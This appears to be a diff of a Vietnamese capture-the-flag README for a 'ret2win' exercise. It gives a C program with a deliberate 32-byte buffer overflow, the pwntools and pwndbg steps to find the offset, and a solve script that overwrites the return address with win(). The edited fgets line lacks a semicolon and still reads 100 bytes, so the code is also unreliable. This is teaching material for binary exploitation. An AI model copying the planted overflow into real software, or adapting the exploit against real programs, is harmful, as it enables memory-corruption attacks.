@@ -1,15 +1,16 @@
 # ret2win_chall_demo_file
 
 ## ret2win.c
+```C
 #include <stdio.h>
 #include <string.h>
 void win() {
-    printf("\nWELL DONE! THIS IS YOUR FLAG: CTF{ret2win_64bit_success}\n");
+    printf("\nWELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}\n");
 }
 void vulnerable() {
     char buffer[32];
     printf("Enter input: ");
-    gets(buffer); // Classic buffer overflow
+   fgets(buffer, 100, stdin)
 }
 int main() {
     setbuf(stdout, NULL);
@@ -18,48 +19,48 @@ int main() {
     printf("Try again!\n");
     return 0;
 }
+```
 
 
-## Cài đặt công cụ biên dịch
-* sudo apt update
-* sudo apt install gcc gcc-multilib -y
-
-## Biên dịch binary
-### 32-bit (chall)
-* gcc -m32 -fno-stack-protector -no-pie -z execstack ret2win.c -o chall
-### 64-bit (chall64)
-* gcc -fno-stack-protector -no-pie -z execstack ret2win.c -o chall64
-
-
-## Cấp quyền thực thi
-* chmod +x chall chall64
 
 
 ## Kiểm tra bảo mật
-* pip install pwntools    # cài pwntools nếu chưa có
+### Cài pwntools
+```bash
+pip install pwntools
+```
+### checksec file
+```bash
+checksec chall1
+```
 
-* checksec chall
-* checksec chall64
 
-
-## Tạo pattern
-* pwndbg> cyclic <length>
+## Tạo pattern 100 kí tự
+```bash
+cyclic 100
+```
 
 
 ## Khi chương trình crash, kiểm tra giá trị EIP/RIP:
-* info registers eip  # 32-bit
-* info registers rip  # 64-bit
+```bash
+info registers rip
+```
 
 
 ## Tìm offset từ giá trị EIP/RIP:
-* cyclic -l <giá_trị_eip/rip>
+```bash
+cyclic -l <giá_trị_eip/rip>
+```
 
 
 ## Tìm địa chỉ hàm win
-* p & win
+```bash
+p & win
+```
 
 
 ## Viết script (solve1.py)
+```python
 from pwn import *
 
 p = process('./chall_ret2win')
@@ -72,7 +73,10 @@ payload += p64(win_addr)       #Ghi đè địa chỉ hàm win lên return addre
 
 p.sendline(payload)
 p.interactive()
+```
 
 
 ## Chạy script
-* python3 solve1.py
+```bash
+  python3 solve1.py
+```
